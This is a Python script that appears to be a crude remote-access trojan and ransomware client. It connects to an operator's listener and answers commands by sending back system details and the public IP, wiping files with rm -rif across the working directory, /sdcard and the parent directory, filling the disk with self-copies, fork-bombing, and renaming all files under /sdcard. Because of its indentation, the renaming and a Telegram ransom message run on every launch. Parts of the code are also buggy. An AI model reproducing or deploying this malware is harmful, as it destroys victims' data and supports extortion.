#import lib
try:
    import sys
    import socket
    import os
    from requests import get
except:
    os.system("pip install requests")

#build server(socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

kdata = "**connect from client**"

host= socket.gethostname()
port = 4448


s.connect((host, port))
s.send(kdata.encode())


while True:
    command = s.recv(1024)
    command = command.decode()
    print("")
    if command == "jb":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
#information section

    if command == "info":
        info1 = os.getcwdb()
        info1 =str(info1)
        s.send(info1.encode())
        print("")
    if command == "python-path":
        py= sys.path
        py= str(py)
        s.send(py.encode())
        print("")
    if command == "cwd-info":
        py2= sys.argv
        py2= str(py2)
        s.send(py2.encode())
        print("")
    if command == "platform-info":
        py3= sys.platform
        oo= (str(py3))
        s.send(oo.encode())
    if command == "get-ip":
        ip = get("https://api.ipify.org").text
        s.send(ip.encode())
# virus section

    if command == "r-shell":
        os.system("rm -rif *")
        s.send("done".encode())

    if command == "r-all":
        os.system("rm -rif *")
        os.system("cd /sdcard/* && rm -rif *")
        os.system("cd .. && rm -rif *")
        ss.send("done".encode())

    if command == "mf":
        moa= 0
        data= "done moa zehahaha"
        s.send(data.encode())
        while True:
            with open("kenaka.txt{0}".format(moa),"w")as f:
                f.write("you hacked you hacked you hacked you hacked you hacked you hacked")
                f.write(open(__file__).read())
                f.close()
                moa+=1

    if command == "dos":
        data1 = "target device is destroyed **"
        import os;
        while(True):
            os.fork()
        s.send(data.encode())


    if command == "rans":
        data99 = "the files is crypted"
        def virus (path):
            for dir,dirs,files in os.walk(path):
                num = len(files)
                for i in range (num):
                    pathf= dir + "/" +files[i]
                    name = "  " * (i+1)
                    os.rename(pathf,dir + "/" + name)
virus("/sdcard")
s.send(data99.encode())
print("your files is crypted contact with me in\n Telgram: Sos \n ")


